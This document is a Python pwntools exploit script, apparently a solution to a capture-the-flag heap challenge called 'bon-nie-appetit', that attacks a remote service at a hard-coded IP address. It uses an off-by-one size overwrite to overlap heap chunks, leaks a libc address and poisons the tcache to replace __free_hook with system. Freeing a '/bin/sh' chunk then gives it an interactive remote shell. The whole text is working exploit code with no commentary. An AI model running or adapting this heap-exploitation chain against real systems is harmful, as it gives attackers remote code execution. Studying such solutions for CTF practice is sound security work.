from pwn import *

context.binary = binary = ELF('./bon-nie-appetit_patched', checksec=False)
libc = ELF('./glibc/libc.so.6')

def create(size, data):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'[*] For how many:', str(size).encode())
	p.sendafter(b'[*] What would you like to order:', data)

def show(idx):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'[*] Number of order: ', str(idx).encode())


def edit(idx, data):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'[*] Number of order: ', str(idx).encode())
	p.sendafter(b'[*] New order: ', data)

def delete(idx):
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b'[*] Number of order: ', str(idx).encode())


#p = process()
p = remote('94.237.59.180',42751)

create(0x18, b'a'*0x18)
create(0x18, b'a'*0x18)
create(0x500, b'aaaa')
create(0x18, b'a'*0x18)

edit(0, b'a'*0x18+b'\x91')

delete(1)
delete(2)

create(0x80, b'a'*0x20)

show(1)
p.recvuntil(b'[+] Order[1] => '+b'a'*0x20)

libc_leak = u64(p.recvline()[:-2].ljust(8, b'\x00'))
libc.address = libc_leak - 0x3ebca0
info(f'LIBC Leak: {hex(libc_leak)}')
info(f'LIBC Base: {hex(libc.address)}')

edit(1, b'a'*0x18+p64(0x510))

create(0x30, b'b'*0x30)
create(0x30, b'b'*0x30)
create(0x30, b'b'*0x30)

edit(1, b'g'*0x18+b'\x81')
delete(2)
delete(5)
delete(4)

create(0x70, b'a'*0x38+p64(0x41)+p64(libc.symbols.__free_hook))
create(0x30, b'pwned')
create(0x30, p64(libc.symbols.system))

create(0x50, b'/bin/sh\x00')

delete(6)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
